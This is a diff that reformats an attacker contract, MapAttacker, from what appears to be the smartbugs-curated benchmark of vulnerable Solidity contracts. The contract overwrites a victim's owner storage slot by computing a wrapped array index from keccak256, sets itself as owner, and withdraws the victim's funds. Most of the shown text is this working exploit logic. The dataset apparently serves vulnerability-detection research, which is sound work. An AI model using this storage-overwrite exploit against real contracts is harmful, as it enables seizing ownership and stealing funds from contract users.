+++ smartbugs-curated/0.4.x/contracts/access_control/mapping_write_attack.sol
@@ -1,4 +1,4 @@
- pragma solidity ^0.4.24;
+pragma solidity ^0.4.24;
 
 import "../dataset/access_control/mapping_write.sol";
 
@@ -15,15 +15,14 @@ contract MapAttacker {
         target.set(key, value);
 
         uint256 slotIndex = uint256(keccak256(abi.encodePacked(uint256(1))));
-        uint256 overwriteIndex = 2**256 -1 - slotIndex + 1;
+        uint256 overwriteIndex = 2 ** 256 - 1 - slotIndex + 1;
 
-        target.set(overwriteIndex, uint(new_owner));
+        target.set(overwriteIndex, uint256(new_owner));
     }
 
     function withdraw_from_victim() public {
         target.withdraw();
     }
 
-    function () public payable {
-    }
+    function() public payable {}
 }
